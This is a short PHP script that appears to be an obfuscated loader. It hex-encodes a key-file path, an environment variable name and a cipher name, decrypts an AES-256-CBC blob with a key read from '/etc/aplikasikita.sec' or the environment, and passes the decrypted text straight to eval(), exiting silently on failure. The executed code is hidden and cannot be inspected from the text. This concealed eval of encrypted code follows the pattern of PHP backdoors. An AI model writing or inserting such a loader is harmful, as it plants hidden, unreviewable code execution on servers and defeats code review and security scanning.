<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('DFM5lLwhhSskflqVzaVfEQ==');

$c=base64_decode(

'HH7te6oRKhCB61lxo+ZFSg2Sq9890zedW9M5Z2u4p0n4WSaNm/FVQsJmglJZWRZVCxKOnKOnLeOc' .
'Hy9bCRgZBwJzgxWgsAsjXpD2micUGrqyII0d+9HNe8v+aoDJt10soquJ1xQKfNzyT99rBRSdPORO' .
'D+mGvixhTBAeEHvpc4zSuxBUuVoLE3NKuH9+k655YMFqhDx6Wym95dPmVx8wy5NTbUHautocxt4W' .
'2tboBttv/e+uYUhKxmooTkoU363UpahnbPapk++cujaTpYBKdel3RglFRSgWMLs4u9EhOIVoHURo' .
'0Vaa5o+UgdddV2zHwu3Lw0AW8rxQOHYSHnyipRrVRM9ViiVnHjgw1mV3RKPcotWVSqMvCKNIKU4P' .
'qOlnAkQCRim56AvY0BUtGGIJjAeP28puBLUFU9+/agTFQWoESZc7v2Wn09ZOKK9okXECXNT1hav4' .
'HAiQtVKvWykNQYUlAXGzOuuOlYGGwx14OgMolyLHizZ2pMj0VoYC0eJNTMB938Ikc5pkbCVCEu2E' .
'M728HYdMXtXyb5xOrQ2BBc8='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

